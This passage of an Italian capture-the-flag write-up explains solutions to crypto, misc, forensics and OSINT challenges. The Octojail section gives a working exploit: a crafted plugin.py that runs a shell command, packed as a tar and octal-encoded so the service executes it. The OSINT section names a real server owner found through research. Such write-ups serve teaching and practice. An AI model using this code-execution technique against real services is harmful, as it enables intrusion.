   * Leggendo **dalla fine** si vede `00 7B 00 66 00 74 00 63` → `{ftc`, cioè il testo è **invertito**.
4. Decodifica come **UTF-16BE**, poi **inverti la stringa**.

##### Riproduzione minimale

```python
from binascii import unhexlify
# ... (codice invariato come nell’originale) ...
```

#### Soluzione

Facendo XOR dei tre body e decodificando il risultato come **UTF-16BE**, poi invertendolo, otteniamo:

```
ctf{d6b72529c6177d8f648ae85f624a24d6f1edce5ca29bd7cc0b888e117a123892}
```

### XORbitant

Questa challenge fornisce due allegati, uno script Python e un dump binario.
In sostanza si tratta di decifrare un ciphertext cifrato con lo XOR tra un plaintext molto grande e la flag.

L’operazione di cifratura è eseguita dal seguente codice:

```python
import os
# ... (codice invariato come nell’originale) ...
```

Questo codice è vulnerabile a frequency attack ma anche a many-time-pad (poiché la flag è riutilizzata su blocchi da 69 caratteri, `ctf{sha256sum}`).
Nel nostro caso abbiamo preferito ricostruire la flag usando il tool CLI `mtp` e, man mano che scoprivamo parti del testo, rivelare la flag carattere per carattere.

Per farlo, è bastato dividere il ciphertext in chunk da 69 byte, codificarli in esadecimale e scriverli riga per riga in un txt da passare al tool.

Una volta fatto, potevamo indovinare i primi 4 byte sapendo che la flag iniziava con `ctf{`.

## Miscellaneous 🐧

### Octojail

#### Panoramica

Un servizio Python legge una stringa di cifre ottali (terzine), le converte in byte, interpreta il risultato come un archivio tar, lo estrae in `uploads/` (con controlli basilari di path), poi importa `plugin.py` e chiama `run()` se presente. Il servizio impone un timeout di 6 secondi, richiede input solo ottale di lunghezza multipla di 3 e limita la dimensione.

#### Osservazione chiave

* Il servizio esegue `plugin.run()` da un `plugin.py` estratto — **arbitrary code execution** tramite un archivio tar fornito.

#### Strategia di exploit

1. Creare un `plugin.py` che esegua l’azione desiderata (es. `ls` o leggere `flag.txt`).
2. Impacchettare `plugin.py` in un archivio tar.
3. Convertire i byte del tar in una stringa di terzine ottali.
4. Fornire quella stringa al servizio.
5. Il servizio estrae l’archivio ed esegue `plugin.run()`, eseguendo il nostro codice.

**Lettura di un file di flag:**

```py
# plugin.py
import os

def run():
    os.system("cat flag.txt")
```

```bash
tar cf plugin.tar plugin.py
```

Conversione del tar in terzine ottali (Python):

```py
# tar_to_octal.py
with open("plugin.tar", "rb") as f:
    data = f.read()

octal = ''.join(f"{b:03o}" for b in data)
print(octal)
```

Questo stampa la stringa ottale da incollare nel prompt del programma target.

#### Conclusione

Dopo aver inviato il nostro script come stringa ottale e l’esecuzione da parte del server, otteniamo la flag.

### onions1

**onions1** è una semplice ma divertente misc challenge che introduce ai servizi nascosti .onion (Tor).

Il compito: visitare il seguente URL .onion usando Tor Browser:

```
2ujjzkrfk4ls4r6vbvvkpn5nyouimcw5hjarezbznvsowfjzup7otdad.onion
```

Una volta avviato Tor e aperto il link, compare la seguente pagina:

![Screenshot della pagina .onion](/images/onions1.png)

Tutto qui! A volte la challenge riguarda solo conoscere lo strumento giusto—qui, Tor Browser.
Se non l’hai mai usato, è una buona occasione per provare e vedere come funzionano i siti .onion.

### Escaping Barcellona

In questa challenge, l’obiettivo era determinare la distanza tra Marte e Barcellona a una data e ora specifiche. La tolleranza consentita era di ±0.009 milioni di chilometri, piuttosto generosa. Questo margine, unito a un po’ di fortuna, ha permesso di evitare le coordinate esatte di Barcellona e concentrarsi invece sulla distanza Terra-Marte nel complesso.

Per risolvere, è stata usata la libreria Astropy, che fornisce calcoli astronomici precisi. Sfruttando le effemeridi JPL, si assicurano posizioni accurate dei pianeti per la data e l’ora indicate. Lo script calcola le posizioni baricentriche di Marte e della Terra, poi la distanza euclidea. Questo approccio evita la necessità di una posizione specifica sulla Terra, dato che la differenza, su questa scala, è trascurabile entro la tolleranza.

Ecco lo script usato:

```python
from astropy.coordinates import EarthLocation, get_body_barycentric, solar_system_ephemeris
from astropy.time import Time
import astropy.units as u

obs_time = Time("2025-11-07 16:00:00")

solar_system_ephemeris.set('jpl')

mars_pos = get_body_barycentric('mars', obs_time)

earth_pos = get_body_barycentric('earth', obs_time)

distance = (mars_pos - earth_pos).norm()
distance_km = distance.to(u.km)

print(f"Distance from Earth to Mars at {obs_time.iso} UTC: {distance_km:.3f}")
```

### Onions2

Onions2 è stata una misc challenge più tosta e intrigante incentrata sui siti .onion (Tor).

Abbiamo iniziato caricando l’immagine fornita dalla challenge su [Aperisolve](https://www.aperisolve.com/). Nascosto nei dati dell’immagine, abbiamo scoperto un URL .onion.

Curiosi, abbiamo avviato Tor e visitato il sito. A prima vista, la pagina sembrava vuota. Dopo un po’ di esplorazione, abbiamo trovato un file di font ospitato sul sito. Dentro quel font, abbiamo scoperto un’altra stringa nascosta.

Abbiamo passato la stringa a CyberChef, che ha rivelato un nuovo indizio:
![alt text](/images/cyberchef-onions2.png)

CyberChef ha decodificato la stringa in un link Google Maps:
[https://www.google.com/maps/place/ARChA/@45.7450165,21.225122,17z/data=!4m16!1m9!3m8!1s0x47455d9b87725af1:0x7a82191592d97493!2sARChA!8m2!3d45.7450165!4d21.2277023!9m1!1b1!16s/g/11vbtv2ys4!3m5!1s0x47455d9b87725af1:0x7a82191592d97493!8m2!3d45.7450165!4d21.2277023!16s/g/11vbtv2ys4?entry=ttu\&g\_ep=EgoyMDI1MDkxMC4wIKXMDSoASAFQAw==](https://www.google.com/maps/place/ARChA/@45.7450165,21.225122,17z/data=!4m16!1m9!3m8!1s0x47455d9b87725af1:0x7a82191592d97493!2sARChA!8m2!3d45.7450165!4d21.2277023!9m1!1b1!16s/g/11vbtv2ys4!3m5!1s0x47455d9b87725af1:0x7a82191592d97493!8m2!3d45.7450165!4d21.2277023!16s/g/11vbtv2ys4?entry=ttu&g_ep=EgoyMDI1MDkxMC4wIKXMDSoASAFQAw==)

Il link ci ha portato all’edificio ARChA dell’Università di Timișoara. Lì abbiamo trovato il pezzo finale del puzzle:
![alt text](/images/qrcode-onions2.png)

Nel complesso, Onions2 è stata un’ottima combinazione di forensics digitale, hidden services e problem solving creativo.

### Disco Dance

Questa challenge forniva due servizi allegati, uno in Python e uno in TypeScript, con l’obiettivo di cifrare la flag usando un seed casuale.

La parte interessante, però, è nel codice Python, poiché il servizio TypeScript (oltre a non essere vulnerabile) si limitava a proxyare richieste HTTP dal server Python a Discord, aggiungendo un private Discord bot token.

Nel server Python si notano due funzioni:

* La funzione `get_random`, che legge 5 messaggi dal canale con id `1416908413375479891`.

```python
def get_random() -> bytes:
    url = f"https://proxy-gamma-steel-32.vercel.app/api/proxy/channels/1416908413375479891/messages?limit=5"
    headers = {
        "Authorization": f"Bot {os.getenv('TOKEN')}",
    }
    # ...
```

* E la funzione `encrypt`, che cifra la flag con **AES CBC** usando i messaggi ottenuti da `get_random` come chiave, dopo averli hashati con SHA256.

```python
def encrypt(data: bytes, key: bytes) -> str:
    digest = SHA256.new()
    digest.update(key)
    aes_key = digest.digest()
    # ...
```

#### Soluzione

Per ottenere la chiave era necessario accedere al canale Discord e, esplorando il server della CTF, abbiamo notato il canale `spam` dove i partecipanti inviavano occasionalmente esattamente 5 messaggi.

Abbiamo confermato che l’ID corrispondeva e abbiamo semplicemente contattato il servizio per far cifrare la flag con una chiave generata da noi.

### Disco Rave

Per comprendere appieno questo writeup, si consiglia di leggere prima `Disco Dance`, dato che il ragionamento generale è già spiegato lì.

L’unico comportamento cambiato è nella `get_random`. In questa challenge, legge gli ultimi 10 messaggi dai canali `1416908413375479891` (**spam**) e `1417154025371209852` (**spam\_plus\_plus**), poi restituisce un’unica stringa contenente timestamp e messaggi, ordinata prima da `spam` e poi da `spam_plus_plus`, da usare come chiave AES.

```python
def get_random() -> bytes:
    channels = [
        "1416908413375479891",
        "1417154025371209852",
    ]
    # ...
```

#### Soluzione

Seguendo la stessa procedura di `Disco Dance`, è possibile ottenere la flag decifrandola con la chiave AES derivata dai nostri messaggi Discord.

## Forensics 🤖

### Unknown Traffic 1

Questa challenge aveva un file `pcap` con vari pacchetti il cui unico scopo era aggiungere rumore al trasporto della flag.
Dopo aver osservato per un po’ i vari flussi (HTTP, UDP, DNS, FTP), abbiamo notato che i flussi ICMP avevano incongruenze rispetto agli altri, poiché i dati inviati nel body delle richieste avevano due formati:

* Dati esadecimali con un piccolo payload alla fine (circa 2 byte)
* Stringhe ASCII poco chiare

Per trovare la flag, abbiamo quindi raccolto i dati in due stringhe separate e, nel primo caso, rimosso il rumore (byte nulli), poi provato a decodificarle su cyberchef.org.

Qui abbiamo notato che la stringa ASCII era in realtà la flag codificata in base64.

#### Script Python

```python
#!/usr/bin/env python3
from base64 import b64decode
import pyshark, re
# ... (codice invariato come nell’originale) ...
```

### Unknown Traffic 2

Questa challenge forniva un `pcap` (`traffic.pcap`) con traffico HTTP e ICMP misto, dove l’obiettivo era ricostruire un file suddiviso in più chunk.
Analizzando il traffico, abbiamo notato due modalità con cui i frammenti erano incorporati:

* Nelle richieste HTTP, la query string portava base64 nel formato: `GET /data?chunk=N&data=...`
* Nei pacchetti ICMP, i payload includevano marker ASCII come: `CHUNK_N:...`

Dopo l’estrazione, ogni indice `chunk` corrispondeva a una parte specifica del file. Alcuni chunk apparivano più volte con dati sovrapposti; in quei casi, si è mantenuta la versione più lunga.

Il processo di ricostruzione:

1. Parsare il pcap come testo (`latin-1`) e fare match di entrambe le codifiche con regex.
2. Raccogliere i frammenti e unirli in base all’indice `chunk`.
3. Concatenare le parti in ordine crescente in un’unica stringa base64.
4. Decodificare il blob base64 finale, aggiungendo padding quando necessario.
5. Scrivere il risultato in `decrypt.bin`.

Il file recuperato è risultato essere un’immagine PNG di un QR code (`680×680 RGBA`).

Per semplificare, abbiamo evitato dipendenze pesanti (es. `pyshark`) e usato uno script minimale con solo `re` e `base64`.

#### Soluzione Python

```py
import re
from base64 import b64decode
from pathlib import Path
# ... (codice invariato come nell’originale) ...
```

#### Nota

Nel presente script non è incluso come scansionare il QR code, dato che può essere fatto con qualsiasi utility online/offline.

### Hidden in the Cartridge

Questa challenge forniva una ROM NES: `space_invaders.nes`. La flag era nascosta direttamente nei dati della cartuccia tra byte apparentemente normali.

Dopo aver estratto stringhe stampabili (con `strings`, un hex editor o uno script), spiccavano lunghe sequenze di **due cifre esadecimali separate da `$$$`**, per esempio:

```
63$$$74$$$66$$$7b ... 30$$$7d
```

Due dettagli le rendevano sospette:

* Forma rigorosa: `[0-9a-f]{2}` ripetuto, sempre separato da `$$$`.
* I primi byte decodificati corrispondono a `63 74 66 7b` -> `c t f {`, e l’ultimo blocco termina con `7d` -> `}`.

Per recuperare la flag, abbiamo raccolto tutti i blocchi in ordine, separato su `$$$`, convertito ogni coppia hex in byte, decodificato come testo e concatenato. Il plaintext risultante è la flag.

#### Script Python

```python
#!/usr/bin/env python3
import re
# ... (codice invariato come nell’originale) ...
```

Questo stampa il token `ctf{...}` recuperato dalla ROM.

### Baofeng

Questa challenge richiedeva di trovare il `callsign` e il `nome` di una città da una comunicazione radio effettuata con un Baofeng, allegata come mp3.

Dopo un paio di ascolti, abbiamo cercato un tool (o creato un band-pass filter) per rimuovere il rumore.
Pur non capendo il parlato, abbiamo usato un’AI per convertire **audio** -> **text**.

Abbiamo ottenuto questo testo:

```
CQ, CQ, CQ, this is Yankee Oscar 2, Tango Sierra Sierra. My QTH is Kilo November 15, Kilo Sierra. CQ, CQ, CQ, this is Yankee Oscar 2, Tango Sierra Sierra.
```

Grazie alla trascrizione, abbiamo capito che la location (aka **`QTH`**) era `KN15KS`, cioè il codice della città da trovare, mentre il callsign era “*Yankee Oscar 2, Tango Sierra Sierra*” che, in codice NATO, diventa **YO2TSS**, la prima parte della flag.

Per trovare la seconda parte, è bastato cercare `KN15KS` su una *Maidenhead grid* per ottenere il nome della città: **`Hunedoara`**.

Metti tutto insieme: `ctf{yo2tss_hunedoara}`.

### 3rd child

Breve task di audio forensics con testo spettrale nascosto in un canale audio.

#### Descrizione della challenge

> My 3rd child believes in ghosts. I don't know how to prove they aren't real.

“Ghosts” → cerca qualcosa che normalmente non si sente ma si può *vedere* (spettrogramma).

#### File fornito

`output.wav`

Analizzando `output.wav` in Audacity si vedono tre componenti: rumore broadband, un sottofondo musicale e un’altra traccia.
La descrizione suggerisce di visualizzare lo spettrogramma dell’ultima traccia.

![alt text](/images/3rdchild.png)

## OSINT 🌏

### Holiday Trip

Questa OSINT richiedeva di trovare la posizione del negozio mostrato nell’immagine.

Dopo varie ricerche con Google Lens e ChatGPT, eravamo bloccati. Tuttavia, abbiamo notato una tazza nell’angolo in alto a sinistra con scritto **`Golden_Sands`**. Abbiamo provato quella come flag e abbiamo risolto la challenge.

### Prison

Questa OSINT richiedeva di trovare sia l’host del server sia il nome del proprietario di un server Minecraft. L’unico indizio era un’immagine con vari nickname e ruoli dei player.

Dall’immagine, ho notato che lo username dell’owner iniziava con "Leaky\_", e c’erano altri player con ruoli come "srwarden", "warden", "guard" e "srguard". Alcuni nomi visibili: PsychNOdelic, ButterInc, Cheese e Dragon. Il server aveva un tema prison.

Per approfondire, ho usato la funzione di deep research di ChatGPT con questo prompt:

> Can you find a Minecraft server where the owner's name starts with Leaky\_ and there are other players with roles like "srwarden", "warden", "guard", "srguard" and names PsychNOdelic, ButterInc, Cheese, Dragon? The server seems prison-based.

Dopo un po’, ChatGPT ha trovato un server chiamato **play.thepen-mc.net**. Sul loro Discord ho potuto confermare lo username completo dell’owner: **Leaky\_Tandos**.
